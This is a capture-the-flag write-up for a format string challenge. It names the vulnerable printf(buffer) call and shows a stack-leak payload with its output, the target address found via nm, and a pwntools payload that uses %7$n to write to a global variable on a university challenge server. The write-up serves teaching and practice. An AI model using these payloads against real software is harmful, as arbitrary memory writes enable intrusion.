# Challenge `Write to Memory` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Format String Vulnerability (Arbitrary Write)
- Where: Where is the vulnerability present
  - In `vuln()` function at `printf(buffer);`. The buffer is fully controlled by user input via `read()` in `main()`.
- Impact: What results of exploiting this vulnerability
  - An attacker can read stack contents and also write arbitrary values to arbitrary memory addresses. this allows overwriting global variables and achieving the challenge goal.

## Steps to reproduce

1. Connect to the challenge service `nc mustard.stt.rnl.tecnico.ulisboa.pt 25193`

2. Inspect the stack layout by sending a stack-leaking payload:
```
AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
---------------
Output:

AAAA.ffffdc6c.0000007f.08049343.00000000.00000001.f7ffd918.41414141.3830252e
```
41414141 appears at the 7th stack position. This corresponds to the start of user-controlled input.

3. Run nm on the binary:
```sh
nm 03_write | grep target
---------------
Output:

0804c040 B target
```
So we now know target is a global variable, located at address `0x0804c040`

4. We want to place the address of target on the stack by using %7$n to write to it. The payload structure will have the first 4 bytes: address of target, then %7$n to write the number of printed bytes to that address.

Python exploit:
```py
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25193
from pwn import *
import sys

sys.stdout.buffer.write(p32(0x0804c040) + b"%7$n")
EOF
```

5. Result: printf interprets %7$n, writes the number of bytes printed so far into target, the challenge condition is satisfied. Exploitation succeeds despite the 4-byte buffer limit